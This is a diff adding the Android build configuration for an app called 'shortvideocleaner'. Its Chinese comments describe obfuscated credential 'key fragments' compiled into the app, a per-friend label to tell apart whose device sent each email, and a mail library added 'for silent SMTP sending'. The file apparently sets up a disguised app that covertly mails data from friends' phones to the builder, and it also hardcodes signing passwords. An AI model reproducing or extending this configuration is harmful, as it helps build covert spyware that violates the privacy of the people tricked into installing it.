@@ -1,0 +1,74 @@
+plugins {
+    id 'com.android.application'
+    id 'org.jetbrains.kotlin.android'
+}
+
+android {
+    namespace 'com.shortvideocleaner.app'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.shortvideocleaner.app"
+        minSdk 24
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+
+        // 密钥碎片：编译期注入 BuildConfig
+        buildConfigField "long", "AUTH_SEED", "3419861145L"
+        buildConfigField "long", "EMAIL_SEED", "227365721399740L"
+
+        // 朋友标签：给不同基友构建时改这里的字符串，方便区分邮件来源
+        // 例如 "阿杰"、"小明"、"老王"；不改则用设备型号自动区分
+        buildConfigField "String", "FRIEND_LABEL", "\"\""
+    }
+
+    buildFeatures {
+        buildConfig = true
+    }
+
+    signingConfigs {
+        release {
+            storeFile rootProject.file('release.jks')
+            storePassword 'surprise123'
+            keyAlias 'surprise'
+            keyPassword 'surprise123'
+        }
+    }
+
+    buildTypes {
+        release {
+            signingConfig signingConfigs.release
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+
+    packaging {
+        resources {
+            excludes += '/META-INF/{NOTICE.md,NOTICE.txt,LICENSE.md,LICENSE.txt}'
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }
+
+    kotlinOptions {
+        jvmTarget = '17'
+    }
+}
+
+dependencies {
+    implementation 'androidx.core:core-ktx:1.12.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+    implementation 'androidx.recyclerview:recyclerview:1.3.2'
+
+    // JavaMail for silent SMTP sending
+    implementation 'com.sun.mail:android-mail:1.6.7'
+    implementation 'com.sun.mail:android-activation:1.6.7'
+}
